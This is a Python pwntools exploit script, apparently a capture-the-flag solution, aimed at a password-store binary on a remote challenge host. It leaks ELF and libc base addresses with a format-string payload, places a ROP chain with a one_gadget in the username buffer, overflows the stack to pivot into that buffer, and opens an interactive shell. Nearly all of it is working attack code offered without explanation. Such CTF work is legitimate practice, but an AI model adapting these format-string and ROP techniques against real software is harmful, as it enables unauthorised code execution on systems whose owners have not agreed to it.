#!/usr/bin/python3

from pwn import *
from typing import Tuple
from password_primitives import PasswordPrimitives

elf = ELF('./passStoreV1')
libc = ELF('./libc.so.6')
ld = ELF('./ld.so')

POP_RSI_GAD = 0x00000000037bda
ONE_GAD = 0xda837


def conn():
    if args.REMOTE:
        r = remote(b'0.cloud.chals.io', 12367)
    elif args.D:
        r = gdb.debug(elf.path, 'c')
    else:
        r = process([elf.path])

    return r


def leak_base_address(primitives: PasswordPrimitives) -> Tuple[int, int]:

    payload = b'%15$p %13$p '
    data = primitives.change_name(payload).split(b' ')

    main = int(data[0], base=16)
    libc_start_main = int(data[1], base=16) - 109

    return main - elf.symbols['main'], libc_start_main - libc.symbols['__libc_start_call_main']


def main():
    # establish connection with default name
    log.info('sending default name')
    primitives = PasswordPrimitives(conn())

    # leak libc base address
    log.info('leaking libc and elf base address')
    elf_base_address, libc_base_address = leak_base_address(primitives)
    log.info(f'elf:{elf_base_address:08x} libc:{libc_base_address:08x}')

    # creating new stack to pevot sp to - ROP CHAIN
    rop = p64(libc_base_address + POP_RSI_GAD) + \
        p64(0) + p64(libc_base_address + ONE_GAD)
    primitives.change_name(rop)

    # trigger bof and move sp to the new buf at 'username'
    payload = b'A' * 0x30
    payload += p64(elf_base_address + elf.symbols['username'] - 8)
    payload += p64(0x10)
    primitives.add_password(payload)

    # get shell :)
    primitives.io.interactive()


if __name__ == "__main__":
    main()

